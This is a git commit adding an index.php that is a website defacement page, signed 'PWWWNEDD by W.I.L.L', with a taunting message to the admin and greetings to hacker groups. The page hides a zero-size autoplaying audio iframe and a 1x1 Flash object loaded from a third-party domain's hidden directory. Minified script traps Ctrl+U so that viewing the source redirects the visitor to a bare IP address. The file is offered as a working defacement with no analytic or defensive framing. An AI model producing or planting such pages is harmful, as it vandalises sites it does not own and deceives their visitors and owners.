43531f2fbfb752ee7efd6cc22e0cf5bba9fd5126
Yantogondrong <44944945+Yantogondrong@users.noreply.github.com>
2018-11-13 18:10:03 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,67 @@
+<html>
+<iframe width="0" height="0" src="https://api.soundcloud.com/tracks/162543055/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscreen></iframe>
+<head>
+<title>PWWWNEDD by W.I.L.L</title>
+<link href='http://fonts.googleapis.com/css?family=Trade+Winds' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Coming+Soon' rel='stylesheet' type='text/css'>
+<table width=100% height=100%>
+<td align=center>
+<style type="text/css">
+#menu {
+  max-height: 6px;
+  font: 16px Trade Winds;
+  margin:10px 5px 5px 5px;
+}
+ 
+#menu a{
+  padding:4px 18px;
+  margin:0;
+  background: #007f74;
+  color: #A4A4A4;
+  text-decoration:none;
+  letter-spacing:1px;
+  border-radius: 5px;
+}
+#menu a:hover{
+  background: #000000;
+  color: #fff;
+  border-bottom:1px solid #333333;
+  border-top:1px solid #333333;}
+ 
+</style>
+ 
+<style>
+      ::-webkit-scrollbar{height:12px; width:12px; background:#000}
+::-webkit-scrollbar-thumb{background-color:#007F74;
+-moz-border-radius:50px; border:1px solid #000; border-radius:55px}
+</style>
+</head>
+<body bgcolor='black'>
+ 
+<center>
+
+<br><br>  
+<center><img class="JZUAbb" src="https://lh3.googleusercontent.com/-Pyv9p83XuFU/W-goEeHwMLI/AAAAAAAAAcQ/IAVTZPpcKN8Wi66UkzPfmN0HbtUI6q_IwCL0BGAs/w530-d-h150-n/eye3.png" alt="Photo">
+<br>
+<font face="Bradley Hand ITC" size="10" color="red">PWWWWWNEED BY W.I.L.L
+<br>
+<font face="Courier" size="4" color="seashell">upss, sorry admin .your index is safe .dont panic !
+<br>
+<font face="Courier" size="4" color="seashell">Greetz
+<br>
+<font face="Courier" size="4" color="seashell">Haroqi - Kenway - Mipers - Ly - Nc_Tesla - Toku - 17Rebu - J S team - P C T - MCT<b>
+<br>
+
+
+
+<div id="footer">
+
+</script> <center><EMBED src="http://greencall.co.kr/.p/we_will_not_go_down.swf" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed></center>
+</body> </html>
+</body>
+	<script>
+	//<![CDATA[
+	shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="http://128.199.102.111/"});
+	//]]>
+	</script>
+</html>
